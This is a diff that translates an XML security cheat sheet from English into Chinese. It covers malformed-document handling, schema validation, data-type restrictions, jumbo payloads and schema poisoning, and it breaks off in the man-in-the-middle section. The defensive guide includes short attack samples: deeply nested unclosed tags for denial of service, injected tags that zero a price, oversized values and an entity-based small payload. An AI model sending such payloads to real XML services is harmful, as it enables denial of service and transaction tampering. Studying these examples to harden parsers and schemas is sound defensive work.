@@ -1,37 +1,37 @@
-# XML Security Cheat Sheet
+# XML 安全备忘录
 
-## Introduction
+## 引言
 
-While the specifications for XML and XML schemas provide you with the tools needed to protect XML applications, they also include multiple security flaws. They can be exploited to perform multiple types of attacks, including file retrieval, server side request forgery, port scanning, and brute forcing. This cheat sheet will make you aware of how attackers can exploit the different possibilities in XML used in libraries and software using two possible attack surfaces:
+虽然 XML 和 XML 模式规范为您提供了保护 XML 应用程序所需的工具，但它们也包含多个安全缺陷。这些缺陷可被利用来执行多种攻击，包括文件检索、服务器端请求伪造、端口扫描和暴力破解。本备忘录将让您了解攻击者如何利用库和软件中使用的 XML 的不同攻击面：
 
-- **Malformed XML Documents**: Exploiting vulnerabilities that occur when applications encounter XML documents that are not well-formed.
-- **Invalid XML Documents**: Exploiting vulnerabilities that occur when documents that do not have the expected structure.
+- **格式错误的 XML 文档**：利用应用程序遇到非格式良好的 XML 文档时出现的漏洞。
+- **无效的 XML 文档**：利用不具有预期结构的文档中的漏洞。
 
-## Dealing with malformed XML documents
+## 处理格式错误的 XML 文档
 
-### Definition of a malformed XML document
+### 格式错误的 XML 文档定义
 
- If an XML document does not follow the W3C XML specification's definition of a well-formed document, it is considered "malformed." **If an XML document is malformed, the XML parser will detect a fatal error, it should stop execution, the document should not undergo any additional processing, and the application should display an error message.** A malformed document can include one or more of the followng problems: a missing ending tag, the order of elements into a nonsensical structure, introducing forbidden characters, and so on.
+如果 XML 文档不遵循 W3C XML 规范对格式良好文档的定义，则被视为"格式错误"。**如果 XML 文档格式错误，XML 解析器将检测到致命错误，应停止执行，文档不应进行任何额外处理，应用程序应显示错误消息。**格式错误的文档可能包含以下一种或多种问题：缺少结束标记、元素顺序不合逻辑、引入禁止的字符等。
 
-### Handling malformed XML documents
+### 处理格式错误的 XML 文档
 
-**To deal with malformed documents, developers should use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents.** In addition, they should only use well-formed documents, validate the contents of each element, and process only valid values within predefined boundaries.
+**为处理格式错误的文档，开发者应使用遵循 W3C 规范且处理格式错误文档不会花费过多时间的 XML 处理器。**此外，他们应仅使用格式良好的文档，验证每个元素的内容，并仅处理预定义边界内的有效值。
 
-#### Malformed XML documents require extra time
+#### 格式错误的 XML 文档需要额外时间
 
-**A malformed document may affect the consumption of Central Processing Unit (CPU) resources.** In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).
+**格式错误的文档可能影响中央处理器（CPU）资源的消耗。**在某些情况下，处理格式错误文档所需的时间可能大于处理格式良好文档所需的时间。当发生这种情况时，攻击者可能利用非对称资源消耗攻击，利用更长的处理时间造成拒绝服务（DoS）。
 
-**To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document.** Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.
+**要分析此攻击的可能性，请分析常规 XML 文档所需的时间与该文档的格式错误版本所需的时间。**然后，考虑攻击者如何将此漏洞与使用多个文档的 XML 泛滥攻击结合起来放大效果。
 
-### Applications Processing Malformed Data
+### 处理格式错误数据的应用程序
 
-**Certain XML parsers have the ability to recover malformed documents.** They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. **Since there are no predefined rules for the recovery process, the approach and results from these parsers may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.**
+**某些 XML 解析器具有恢复格式错误文档的能力。**它们可以被指示尽最大努力返回一个包含所有可解析内容的有效树，而不管文档是否符合规范。**由于恢复过程没有预定义规则，这些解析器的方法和结果可能并不总是相同。使用格式错误的文档可能导致与数据完整性相关的意外问题。**
 
-The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:
+以下两种场景说明了解析器在恢复模式下将分析的攻击向量：
 
-#### Malformed Document to Malformed Document
+#### 格式错误文档到格式错误文档
 
-According to the XML specification, the string `--` (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:
+根据 XML 规范，字符串 `--`（双连字符）不得出现在注释中。使用 lxml 和 PHP 的恢复模式，以下文档在恢复后将保持不变：
 
 ```xml
 <element>
@@ -41,9 +41,9 @@ According to the XML specification, the string `--` (double-hyphen) must not occ
 </element>
 ```
 
-#### Well-Formed Document to Well-Formed Document Normalized
+#### 格式良好文档到规范化的格式良好文档
 
-Certain parsers may consider normalizing the contents of your `CDATA` sections. This means that they will update the special characters contained in the `CDATA` section to contain the safe versions of these characters even though is not required:
+某些解析器可能会考虑规范化 `CDATA` 节的内容。这意味着即使不是必需的，它们也会更新 `CDATA` 节中包含的特殊字符以包含这些字符的安全版本：
 
 ```xml
 <element>
@@ -51,7 +51,7 @@ Certain parsers may consider normalizing the contents of your `CDATA` sections. 
 </element>
 ```
 
-Normalization of a `CDATA` section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:
+`CDATA` 节的规范化不是解析器中的通用规则。Libxml 可能会将此文档转换为其规范版本，但尽管格式良好，但其内容可能取决于情况被视为格式错误：
 
 ```xml
 <element>
@@ -59,9 +59,9 @@ Normalization of a `CDATA` section is not a common rule among parsers. Libxml co
 </element>
 ```
 
-### Handling coercive parsing
+### 处理强制解析
 
-**One popular coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target.** Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:
+**XML 中一种流行的强制攻击涉及解析没有相应结束标记的深度嵌套 XML 文档。其目的是使受害者耗尽机器资源并最终对目标造成拒绝服务。**Firefox 3.67 的 DoS 攻击报告包括使用 30,000 个没有相应结束标记的打开 XML 元素。移除结束标记简化了攻击，因为要达到相同结果只需要格式良好文档大小的一半。最终处理的标记数量导致堆栈溢出。这种文档的简化版本如下所示：
 
 ```xml
 <A1>
@@ -71,19 +71,19 @@ Normalization of a `CDATA` section is not a common rule among parsers. Libxml co
     <A30000>
 ```
 
-## Violation of XML Specification Rules
+## 违反 XML 规范规则
 
-Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. **It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.**
+使用不遵循 W3C 规范的解析器操作文档可能会导致意外后果。**当软件未正确验证如何处理不正确的 XML 结构时，可能会导致崩溃和/或代码执行。使用模糊的 XML 文档可能会暴露这种行为。**
 
-## Dealing with invalid XML documents
+## 处理无效的 XML 文档
 
-**Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values.** Schemas specify restrictions that help identify whether documents are valid, and a valid document is well formed and complies with the restrictions of a schema. More than one schema can be used to validate a document, and these restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.
+**攻击者可能在文档中引入意外值，以利用未验证文档是否包含有效值集的应用程序。**模式指定了帮助识别文档是否有效的限制，有效文档格式良好且符合模式的限制。可以使用多个模式来验证文档，这些限制可能出现在多个文件中，可以使用单一模式语言，也可以依赖不同模式语言的优势。
 
-The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.
+为避免这些漏洞，建议每个 XML 文档都必须有一个精确定义的 XML 模式（非 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)），并对每条信息进行适当限制以避免数据验证不当的问题。使用本地副本或已知的良好存储库，而不是 XML 文档中提供的模式引用。另外，对被引用的 XML 模式文件执行完整性检查，并记住存储库可能已被入侵。在使用远程模式的 XML 文档情况下，配置服务器仅使用安全的加密通信，以防止攻击者窃听网络流量。
 
-### Document without Schema
+### 无模式文档
 
-Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an `id` value related to an item and a certain `price`. The user may only introduce a certain `id` value using the web interface:
+考虑一个通过 Web 界面使用 Web 服务进行交易的书商。交易的 XML 文档由两个元素组成：与项目相关的 `id` 值和特定的 `price`。用户只能通过 Web 界面输入特定的 `id` 值：
 
 ```xml
 <buy>
@@ -92,7 +92,7 @@ Consider a bookseller that uses a web service through a web interface to make tr
 </buy>
 ```
 
-**If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents**:
+**如果对文档结构没有控制，应用程序还可能处理具有意外后果的不同格式良好的消息。前面的文档可能包含额外的标记以影响处理其内容的底层应用程序的行为**：
 
 ```xml
 <buy>
@@ -101,11 +101,11 @@ Consider a bookseller that uses a web service through a web interface to make tr
 </buy>
 ```
 
-Notice again how the value 123 is supplied as an `id`, but now the document includes additional opening and closing tags. The attacker closed the `id` element and sets a bogus `price` element to the value 0. The final step to keep the structure well-formed is to add one empty `id` element. After this, the application adds the closing tag for `id` and set the `price` to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.
+请注意，123 值仍作为 `id` 提供，但现在文档包含额外的开放和关闭标记。攻击者关闭了 `id` 元素并将虚假的 `price` 元素设置为 0 值。最后一步是保持结构格式良好，添加一个空的 `id` 元素。之后，应用程序为 `id` 添加结束标记并将 `price` 设置为 10。如果应用程序仅处理 ID 和值的第一个值，而不对结构进行任何控制，则可能使攻击者受益，使其能够在不实际支付的情况下购买书籍。
 
-### Unrestrictive Schema
+### 非限制性模式
 
-**Certain schemas do not offer enough restrictions for the type of data that each element can receive.** This is what normally happens when using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's `age` is validated against an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema:
+**某些模式对每个元素可以接收的数据类型没有提供足够的限制。**这通常发生在使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 时；与可以在 XML 文档中应用的限制类型相比，它具有非常有限的可能性。这可能使应用程序暴露于元素或属性中的不需要的值，而在使用其他模式语言时可以轻松约束这些值。在下面的示例中，使用内联 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 模式验证一个人的 `age`：
 
 ```xml
 <!DOCTYPE person [
@@ -119,21 +119,21 @@ Notice again how the value 123 is supplied as an `id`, but now the document incl
 </person>
 ```
 
-The previous document contains an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) with a root element named `person`. This element contains two elements in a specific order: `name` and then `age`. The element `name` is then defined to contain `PCDATA` as well as the element `age`.
+上面的文档包含一个内联 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)，其根元素名为 `person`。该元素按特定顺序包含两个元素：`name`，然后是 `age`。`name` 元素被定义为包含 `PCDATA`，以及 `age` 元素。
 
-After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the `age` element contains one million digits. Since there are no restrictions on the maximum size for the `age` element, this one-million-digit string could be sent to the server for this element.
+在此定义之后是格式良好且有效的 XML 文档。`name` 元素包含一个无关的值，但 `age` 元素包含一百万个数字。由于对 `age` 元素的大小没有限制，这个一百万位数的字符串可能被发送到服务器。
 
-Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents.
+通常，这种类型的元素应该被限制为不超过特定数量的字符，并约束为特定的字符集（例如，0 到 9 的数字、+ 号和 - 号）。如果没有适当的限制，应用程序可能会处理文档中包含的潜在无效值。
 
-Since it is not possible to indicate specific restrictions (a maximum length for the element `name` or a valid range for the element `age`), this type of schema increases the risk of affecting the integrity and availability of resources.
+由于无法指定特定限制（`name` 元素的最大长度或 `age` 元素的有效范围），这种类型的模式会增加影响资源完整性和可用性的风险。
 
-### Improper Data Validation
+### 不当的数据验证
 
-**When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.**
+**当模式定义不安全且未提供严格规则时，可能会使应用程序暴露于各种情况。其结果可能是披露内部错误或使用意外值冲击应用程序功能的文档。**
 
-#### String Data Types
+#### 字符串数据类型
 
-Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:
+如果需要使用十六进制值，那么将此值定义为稍后将限制为特定 16 个十六进制字符的字符串是没有意义的。举例说明这种情况，在使用 XML 加密时，某些值必须使用 base64 编码。以下是这些值应该如何看起来的模式定义：
 
 ```xml
 <element name="CipherData" type="xenc:CipherDataType"/>
@@ -145,24 +145,24 @@ Provided you need to use a hexadecimal value, there is no point in defining this
  </complexType>
 ```
 
-The previous schema defines the element `CipherValue` as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.
+上面的模式将 `CipherValue` 元素定义为 base64 数据类型。例如，IBM WebSphere DataPower SOA 设备允许在有效 base64 值之后的元素中包含任何类型的字符，并将其视为有效。
 
-The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the `CipherData` element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.
+这些数据的第一部分被正确检查为 base64 值，但剩余的字符可以是其他任何内容（包括 `CipherData` 元素的其他子元素）。元素的限制是部分设置的，这意味着信息可能是使用应用程序而不是建议的示例模式进行测试的。
 
-#### Numeric Data Types
+#### 数值数据类型
 
-**Defining the correct data type for numbers can be more complex since there are more options than there are for strings.**
+**为数字定义正确的数据类型可能更复杂，因为可用的选项比字符串多。**
 
-##### Negative and Positive Restrictions
+##### 负数和正数限制
 
-XML Schema numeric data types can include different ranges of numbers. They can include:
+XML 模式数值数据类型可以包括不同范围的数字。它们可以包括：
 
-- **negativeInteger**: Only negative numbers
-- **nonNegativeInteger**: Positive numbers and the zero value
-- **positiveInteger**: Only positive numbers
-- **nonPositiveInteger**: Negative numbers and the zero value
+- **negativeInteger**：仅负数
+- **nonNegativeInteger**：正数和零值
+- **positiveInteger**：仅正数
+- **nonPositiveInteger**：负数和零值
 
-The following sample document defines an `id` for a product, a `price`, and a `quantity` value that is under the control of an attacker:
+以下示例文档定义了一个产品的 `id`、`price` 和受攻击者控制的 `quantity` 值：
 
 ```xml
 <buy>
@@ -172,7 +172,7 @@ The following sample document defines an `id` for a product, a `price`, and a `q
 </buy>
 ```
 
-**To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:**
+**为避免重复旧错误，可以定义 XML 模式以防止在攻击者想要引入额外元素的情况下处理不正确的结构：**
 
 ```xml
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
@@ -188,11 +188,11 @@ The following sample document defines an `id` for a product, a `price`, and a `q
 </xs:schema>
 ```
 
-Limiting that `quantity` to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing `price*quantity`. **However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.**
+将 `quantity` 限制为整数数据类型将避免任何意外字符。当应用程序接收到前面的消息时，可能通过 `price*quantity` 计算最终价格。**然而，由于此数据类型可能允许负值，如果攻击者提供负数，可能会导致用户账户出现负结果。你可能希望看到这里使用 positiveInteger 而不是 integer 以避免这种逻辑漏洞。**
 
-##### Divide by Zero
+##### 除零
 
-**Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error `FOAR0001` will occur. Other applications may throw other exceptions and the program may crash.** There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type `positiveInteger` for the element.
+**在使用用户控制的值作为除数时，开发者应避免允许数字零。在 XSLT 中使用零值进行除法时，将发生 `FOAR0001` 错误。其他应用程序可能抛出其他异常，程序可能崩溃。**对于 XML 模式，有特定的数据类型可以专门避免使用零值。例如，在不考虑负值和零值有效的情况下，模式可以为元素指定 `positiveInteger` 数据类型。
 
 ```xml
 <xs:element name="denominator">
@@ -202,13 +202,13 @@ Limiting that `quantity` to an integer data type will avoid any unexpected chara
 </xs:element>
 ```
 
-The element `denominator` is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.
+`denominator` 元素现在被限制为正整数。这意味着只有大于零的值才被视为有效。如果看到使用其他类型的限制，当除数为零时可能会触发错误。
 
-##### Special Values: Infinity and Not a Number (NaN)
+##### 特殊值：无穷大和非数字（NaN）
 
-The data types `float` and `double` contain real numbers and some special values: `-Infinity` or `-INF`, `NaN`, and `+Infinity` or `INF`. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies.
+`float` 和 `double` 数据类型包含实数和一些特殊值：`-Infinity` 或 `-INF`、`NaN` 和 `+Infinity` 或 `INF`。这些可能性对于表达某些值很有用，但有时会被误用。问题在于它们通常用于仅表示实数，如价格。这是在其他编程语言中常见的错误，不仅限于这些技术。
 
-Not considering the whole spectrum of possible values for a data type could make underlying applications fail. **If the special values `Infinity` and `NaN` are not required and only real numbers are expected, the data type `decimal` is recommended:**
+不考虑数据类型的整个可能值范围可能会导致底层应用程序失败。**如果不需要特殊值 `Infinity` 和 `NaN`，且仅期望实数，建议使用 `decimal` 数据类型：**
 
 ```xml
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
@@ -224,15 +224,15 @@ Not considering the whole spectrum of possible values for a data type could make
 </xs:schema>
 ```
 
-**The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.**
+**当设置为无穷大或 NaN 时，价格值不会触发任何错误，因为这些值将不被视为有效。如果允许这些值，攻击者可以利用这个问题。**
 
-#### General Data Restrictions
+#### 常规数据限制
 
-After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:
+在选择适当的数据类型后，开发者可以应用额外的限制。有时，数据类型中只有特定子集的值被视为有效。
 
-##### Prefixed Values
+##### 前缀值
 
-**Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called `enumeration` in an XML schema.** The following example restricts the contents of the element month to 12 possible values:
+**某些类型的值应仅限于特定集合：交通灯只有三种颜色，只有 12 个月份可用，等等。模式可以为每个元素或属性设置这些限制。这是应用程序最完美的允许列表场景：只接受特定值。在 XML 模式中，这种约束称为 `枚举`。**下面的示例将月份元素的内容限制为 12 个可能的值：
 
 ```xml
 <xs:element name="month">
@@ -255,11 +255,11 @@ After selecting the appropriate data type, developers may apply additional restr
 </xs:element>
 ```
 
-By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.
+通过将月份元素的值限制为上述任何值，应用程序将不会处理随机字符串。
 
-##### Ranges
+##### 范围
 
-Software applications, databases, and programming languages normally store information within specific ranges. **Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid.** The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:
+软件应用程序、数据库和编程语言通常在特定范围内存储信息。**在使用元素或属性的位置，某些特定大小很重要（以避免溢出或下溢），检查数据长度是否有效是很合理的。**以下模式可以使用最小和最大长度约束名称，以避免异常情况：
 
 ```xml
 <xs:element name="name">
@@ -272,7 +272,7 @@ Software applications, databases, and programming languages normally store infor
 </xs:element>
 ```
 
-In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:
+在可能的值被限制为特定长度（假设为 8）的情况下，可以按以下方式指定以使其有效：
 
 ```xml
 <xs:element name="name">
@@ -284,9 +284,9 @@ In cases where the possible values are restricted to a certain specific length (
 </xs:element>
 ```
 
-##### Patterns
+##### 模式
 
-Certain elements or attributes may follow a specific syntax. You can add `pattern` restrictions when using XML schemas. **When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific `pattern`:**
+某些元素或属性可能遵循特定语法。使用 XML 模式时可以添加 `模式` 限制。**当你希望确保数据符合特定模式时，可以为其创建特定定义。社会保障号（SSN）可以作为一个很好的例子；它们必须使用特定的字符集、特定长度和特定的 `模式`：**
 
 ```xml
 <xs:element name="SSN">
@@ -298,13 +298,13 @@ Certain elements or attributes may follow a specific syntax. You can add `patter
 </xs:element>
 ```
 
-Only numbers between `000-00-0000` and `999-99-9999` will be allowed as values for a SSN.
+只有 `000-00-0000` 到 `999-99-9999` 之间的数字才被允许作为 SSN 的值。
 
-##### Assertions
+##### 断言
 
-**Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable `$value` can be used to reference the contents of the value being analyzed.**
+**断言组件在 XML 模式上约束相关元素和属性的存在和值。仅当测试求值为真且不引发任何错误时，元素或属性才被视为有效。可以使用变量 `$value` 引用正在分析的值的内容。**
 
-The *Divide by Zero* section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an `assertion` disallowing the number zero:
+上面的*除零*部分引用了对于除数使用包含零值的数据类型的潜在后果，并建议使用仅包含正值的数据类型。相反的例子将除零外的整个数字范围视为有效。为避免披露潜在错误，可以使用 `断言`（不允许数字零）检查值：
 
 ```xml
 <xs:element name="denominator">
@@ -316,13 +316,13 @@ The *Divide by Zero* section above referenced the potential consequences of usin
 </xs:element>
 ```
 
-The assertion guarantees that the `denominator` will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.
+该断言保证 `denominator` 不会包含零作为有效数字，同时也允许负数作为有效除数。
 
-##### Occurrences
+##### 出现次数
 
-**The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed.** Two attributes specify minimum and maximum limits: `minOccurs` and `maxOccurs`.
+**不定义最大出现次数的后果可能比应对接收到极端数量的待处理项目时可能发生的后果更糟。**两个属性指定最小和最大限制：`minOccurs` 和 `maxOccurs`。
 
- The default value for both the `minOccurs` and the `maxOccurs` attributes is `1`, but certain elements may require other values. For instance, if a value is optional, it could contain a `minOccurs` of 0, and if there is no limit on the maximum amount, it could contain a `maxOccurs` of `unbounded`, as in the following example:
+`minOccurs` 和 `maxOccurs` 属性的默认值都是 `1`，但某些元素可能需要其他值。例如，如果一个值是可选的，它可以包含 `minOccurs` 为 0，如果对最大数量没有限制，它可以包含 `maxOccurs` 为 `unbounded`，如下例所示：
 
 ```xml
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
@@ -343,21 +343,21 @@ The assertion guarantees that the `denominator` will not contain the value zero 
 </xs:schema>
 ```
 
-The previous schema includes a root element named `operation`, which can contain an unlimited (`unbounded`) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. **Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an `unbounded` value.**
+上面的模式包含一个名为 `operation` 的根元素，可以包含无限（`unbounded`）数量的购买元素。这是常见的发现，因为开发者通常不想限制最大出现次数。**使用无限出现的应用程序应测试当接收到极大数量的待处理元素时会发生什么。由于计算资源是有限的，应分析其后果，并最终应使用最大数量，而不是 `unbounded` 值。**
 
-### Jumbo Payloads
+### 巨型有效载荷
 
-**Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.**
+**发送 1GB 的 XML 文档只需要服务器处理一秒钟，可能不值得作为攻击考虑。相反，攻击者会寻找一种方法，使生成这类攻击所用的 CPU 和流量最小化，同时与处理请求所用的服务器 CPU 或流量总量相比。**
 
-#### Traditional Jumbo Payloads
+#### 传统巨型有效载荷
 
-**There are two primary methods to make a document larger than normal:**
+**有两种主要方法可以使文档比正常情况大：**
 
-**- Depth attack: using a huge number of elements, element names, and/or element values.**
+**- 深度攻击：使用大量元素、元素名称和/或元素值。**
 
-**- Width attack: using a huge number of attributes, attribute names, and/or attribute values.**
+**- 宽度攻击：使用大量属性、属性名称和/或属性值。**
 
-In most cases, the overall result will be a huge document. This is a short example of what this looks like:
+在大多数情况下，最终结果将是一个巨大的文档。以下是这种情况的简短示例：
 
 ```xml
 <SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
@@ -368,9 +368,9 @@ In most cases, the overall result will be a huge document. This is a short examp
  ...
 ```
 
-#### "Small" Jumbo Payloads
+#### "小型"巨型有效载荷
 
-**The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads.** The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:
+**下面的示例是一个非常小的文档，但处理此文档的结果可能类似于处理传统巨型有效载荷。**这种小型有效载荷的目的是允许攻击者快速发送多个文档，使应用程序消耗大部分或全部可用资源：
 
 ```xml
 <?xml version="1.0"?>
@@ -380,17 +380,17 @@ In most cases, the overall result will be a huge document. This is a short examp
 <root>&file;</root>
 ```
 
-### Schema Poisoning
+### 模式投毒
 
-**When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (e.g., file retrieval, denial of service).** An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.
+**当攻击者能够引入对模式的修改时，可能会产生多种高风险后果。特别是，如果模式使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)（例如，文件检索、拒绝服务），这些后果的影响将更加危险。**攻击者可以在众多场景中利用这类漏洞，这取决于模式的位置。
 
-#### Local Schema Poisoning
+#### 本地模式投毒
 
-**Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document.**
+**本地模式投毒发生在模式在同一主机上可用的情况下，无论模式是否嵌入在同一 XML 文档中。**
 
-##### Embedded Schema
+##### 嵌入式模式
 
-**The most trivial type of schema poisoning takes place when the schema is defined within the same XML document.** Consider the following, unknowingly vulnerable example provided by the W3C :
+**最简单的模式投毒发生在模式在同一 XML 文档中定义的情况。**考虑以下由 W3C 提供的、不知不觉中存在漏洞的示例：
 
 ```xml
 <?xml version="1.0"?>
@@ -409,11 +409,11 @@ In most cases, the overall result will be a huge document. This is a short examp
 </note>
 ```
 
-All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. **This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.**
+note 元素的所有限制都可以被移除或更改，允许向服务器发送任何类型的数据。此外，如果服务器正在处理外部实体，攻击者可以使用模式，例如，从服务器读取远程文件。**这种类型的模式仅作为发送文档的建议，但必须包含一种检查嵌入式模式完整性的方法才能安全使用。通过嵌入式模式的攻击通常用于利用外部实体扩展。嵌入式 XML 模式还可以辅助对内部主机进行端口扫描或暴力攻击。**
 
-##### Incorrect Permissions
+##### 不正确的权限
 
-**You can often circumvent the risk of using remotely tampered versions by processing a local schema.**
+**通过处理本地模式，你通常可以规避使用远程篡改版本的风险。**
 
 ```xml
 <!DOCTYPE note SYSTEM "note.dtd">
@@ -425,21 +425,21 @@ All restrictions on the note element could be removed or altered, allowing the s
 </note>
 ```
 
-**However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions.** The following line exemplifies a schema using permissions that allow any user to make modifications:
+**然而，如果本地模式没有正确的权限，内部攻击者可能会更改原始限制。**下面这行示例展示了一个使用允许任何用户进行修改的权限的模式：
 
 ```text
 -rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
 ```
 
-The permissions set on `name.dtd` allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.
+`name.dtd` 上设置的权限允许系统上的任何用户进行修改。这个漏洞显然与 XML 或模式的结构无关，但由于这些文档通常存储在文件系统中，值得一提的是，攻击者可能会利用这类问题。
 
-#### Remote Schema Poisoning
+#### 远程模式投毒
 
-**Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.**
+**通常由外部组织定义的模式会被远程引用。如果能够转移或访问网络流量，攻击者可能导致受害者获取与原本预期不同类型的内容。**
 
-##### Man-in-the-Middle (MitM) Attack
+##### 中间人（MitM）攻击
 
-When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. **When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:**
